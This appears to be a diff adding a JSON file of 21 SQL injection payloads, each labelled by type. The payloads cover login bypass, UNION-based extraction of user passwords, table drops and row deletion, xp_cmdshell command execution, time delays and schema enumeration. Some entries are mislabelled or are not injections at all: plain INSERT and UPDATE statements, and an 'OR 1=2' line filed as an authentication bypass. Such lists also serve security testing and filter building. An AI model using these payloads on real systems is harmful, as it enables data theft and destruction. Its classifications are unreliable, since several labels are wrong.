@@ -1,0 +1,86 @@
+{
+    "1": {
+        "type": "Authentication Bypass",
+        "payload": "' OR 1=1 --"
+    },
+    "2": {
+        "type": "Union-based Injection",
+        "payload": "UNION SELECT username, password FROM users"
+    },
+    "3": {
+        "type": "Table Deletion",
+        "payload": "DROP TABLE users"
+    },
+    "4": {
+        "type": "Logical Bypass",
+        "payload": "SELECT * FROM products WHERE name = 'book' OR 1=1"
+    },
+    "5": {
+        "type": "Authentication Bypass",
+        "payload": "' AND '1'='1"
+    },
+    "6": {
+        "type": "Union-based Injection",
+        "payload": "SELECT id, name FROM employees WHERE id = 1 UNION SELECT NULL, user, password FROM users"
+    },
+    "7": {
+        "type": "Insert Injection",
+        "payload": "INSERT INTO users (username, password) VALUES ('admin', 'password')"
+    },
+    "8": {
+        "type": "Update Injection",
+        "payload": "UPDATE products SET price = 100 WHERE product_id = 1; --'"
+    },
+    "9": {
+        "type": "Delete Injection",
+        "payload": "DELETE FROM users WHERE username = 'admin'; --'"
+    },
+    "10": {
+        "type": "Authentication Bypass",
+        "payload": "' OR 'a'='a"
+    },
+    "11": {
+        "type": "Table Deletion",
+        "payload": "1'; DROP TABLE users--"
+    },
+    "12": {
+        "type": "Data Extraction",
+        "payload": "1'; SELECT * FROM users WHERE '1'='1"
+    },
+    "13": {
+        "type": "Command Injection",
+        "payload": "1'; EXEC xp_cmdshell('dir')--"
+    },
+    "14": {
+        "type": "Time-based Injection",
+        "payload": "1'; WAITFOR DELAY '0:0:10'--"
+    },
+    "15": {
+        "type": "Schema Enumeration",
+        "payload": "1'; SELECT * FROM information_schema.tables--"
+    },
+    "16": {
+        "type": "Data Extraction",
+        "payload": "1'; SELECT * FROM users WHERE username LIKE '%admin%'--"
+    },
+    "17": {
+        "type": "Data Extraction",
+        "payload": "1'; SELECT * FROM users WHERE password LIKE '%pass%'--"
+    },
+    "18": {
+        "type": "Conditional Query",
+        "payload": "1'; SELECT * FROM users WHERE id = 1 AND 1=1--"
+    },
+    "19": {
+        "type": "Conditional Query",
+        "payload": "1'; SELECT * FROM users WHERE id = 1 AND 1=2--"
+    },
+    "20": {
+        "type": "Authentication Bypass",
+        "payload": "1'; SELECT * FROM users WHERE id = 1 OR 1=1--"
+    },
+    "21": {
+        "type": "Authentication Bypass",
+        "payload": "1'; SELECT * FROM users WHERE id = 1 OR 1=2--"
+    }
+}
